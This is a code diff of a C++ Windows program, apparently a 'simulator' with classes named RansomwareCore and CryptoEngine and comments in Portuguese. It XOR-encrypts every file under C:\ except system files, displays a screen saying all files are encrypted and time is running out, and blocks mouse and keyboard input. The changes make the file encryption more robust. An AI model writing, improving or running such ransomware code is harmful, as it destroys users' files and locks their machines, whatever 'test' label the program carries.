@@ -6,7 +6,7 @@
 #include <chrono>
 #include <thread>
 #include <atomic>
-#include <windows.h> // Essencial para cores e controle de prioridade
+#include <windows.h> 
 
 namespace fs = std::filesystem;
 
@@ -18,7 +18,7 @@ enum class AppState {
     SUCCESS
 };
 
-// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA (XOR ENGINE) ---
+// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
 class CryptoEngine {
 private:
     char key; 
@@ -29,24 +29,28 @@ public:
     }
 
     void processFile(const fs::path& filePath, bool encrypt) {
-        std::ifstream inFile(filePath, std::ios::binary);
-        if (!inFile) return;
+        try {
+            std::ifstream inFile(filePath, std::ios::binary);
+            if (!inFile) return;
 
-        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
-        inFile.close();
+            std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+            inFile.close();
 
-        for (size_t i = 0; i < buffer.size(); i++) {
-            buffer[i] ^= key; 
-        }
+            if (buffer.empty()) return;
 
-        std::ofstream outFile(filePath, std::ios::binary);
-        if (!outFile) return;
-        outFile.write(buffer.data(), buffer.size());
-        outFile.close();
+            for (size_t i = 0; i < buffer.size(); i++) {
+                buffer[i] ^= key; 
+            }
+
+            std::ofstream outFile(filePath, std::ios::binary);
+            if (!outFile) return;
+            outFile.write(buffer.data(), buffer.size());
+            outFile.close();
+        } catch (...) { }
     }
 };
 
-// --- MÓDULO 3: SCANNER DE ARQUIVOS ---
+// --- MÓDULO 3: SCANNER DE ARQUIVOS (ROBUSTO) ---
 class FileScanner {
 private:
     CryptoEngine& engine;
@@ -57,10 +61,11 @@ public:
     void scanAndProcess(const std::string& targetDir, bool encrypt) {
         if (!fs::exists(targetDir)) return;
 
-        for (const auto& entry : fs::recursive_directory_iterator(targetDir)) {
+        for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
+             it != fs::end(it); it++) {
             try {
-                if (entry.is_regular_file()) {
-                    std::string pathStr = entry.path().string();
+                if (it->is_regular_file()) {
+                    std::string pathStr = it->path().string();
 
                     if (pathStr.find("Windows") != std::string::npos || 
                         pathStr.find("simulador.exe") != std::string::npos) continue;
@@ -68,7 +73,7 @@ public:
                     if (pathStr.find(".sys") != std::string::npos || 
                         pathStr.find(".dll") != std::string::npos) continue;
 
-                    engine.processFile(entry.path(), encrypt);
+                    engine.processFile(it->path(), encrypt);
                 }
             } catch (...) { continue; }
         }
@@ -112,9 +117,9 @@ private:
 
 public:
     void renderUI(const RansomwareCore& core) {
-        system("cls"); // Limpa a tela para o efeito de tela cheia
+        system("cls"); // Limpa a tela para o efeito de interface
 
-        // 1. Desenha a Arte ASCII em Vermelho
+        // 1. Desenha a Arte ASCII em Vermelho Brilhante
         setTextColor(12); // Vermelho Brilhante
         std::cout << "\n\n";
         std::cout << " //                                               \n";
@@ -137,7 +142,7 @@ public:
         std::cout << " //                                               \n";
 
         std::cout << "\n====================================================\n";
-        std::cout << "        [SISTEMA BLOQUEADO - MODO INTERFACE]        \n";
+        std::cout << "        [SISTEMA TOTALMENTE BLOQUEADO]              \n";
         std::cout << "====================================================\n";
         
         // 2. Mensagem de Alerta
@@ -147,7 +152,7 @@ public:
         setTextColor(7); // Branco
         std::cout << "----------------------------------------------------\n";
         std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
-        std::cout << "  O TEMPO ESTA CORRENDO. NÃO TENTE FECHAR O SISTEMA. \n";
+        std::cout << "  O TEMPO ESTA CORRENDO. NAO TENTE FECHAR O SISTEMA. \n";
         std::cout << "----------------------------------------------------\n";
 
         if (core.getState() == AppState::LOCKED_PERMANENTLY) {
@@ -167,10 +172,10 @@ public:
 // --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
     // CONFIGURAÇÃO DO ALVO
-    std::string pastaAlvo = "C:\\"; 
+    std::string pastaAlvo = "C:\\"; // Mude para sua pasta de teste primeiro!
     std::string senhaCorreta = "batata";
     
-    // Aumentar a prioridade do processo para o Windows dar atenção ao programa
+    // Prioridade máxima para o processo
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
 
     RansomwareCore core;
@@ -179,15 +184,15 @@ int main() {
     Renderer renderer;
 
     std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
-    std::cout << "Alvo configurado: " << pastaAlvo << "\n";
+    std::cout << "Alvo: " << pastaAlvo << "\n";
+    std::cout << "Aguarde a preparacao...\n";
 
-    // 1. Inicia a Criptografia Imediata
-    std::cout << "[!] Iniciando processo de criptografia...\n";
+    // 1. Inicia a Criptografia
     scanner.scanAndProcess(pastaAlvo, true); 
-    std::cout << "[!] Arquivos criptografados com sucesso.\n";
+    std::cout << "[!] Criptografia concluida.\n";
 
     // 2. Bloqueio de Hardware (Mouse e Teclado)
-    // Nota: Para o bloqueio total, rode como Administrador
+    // IMPORTANTE: Rodar como Administrador para o BlockInput funcionar
     BlockInput(TRUE); 
 
     // 3. Inicia o Timer em background
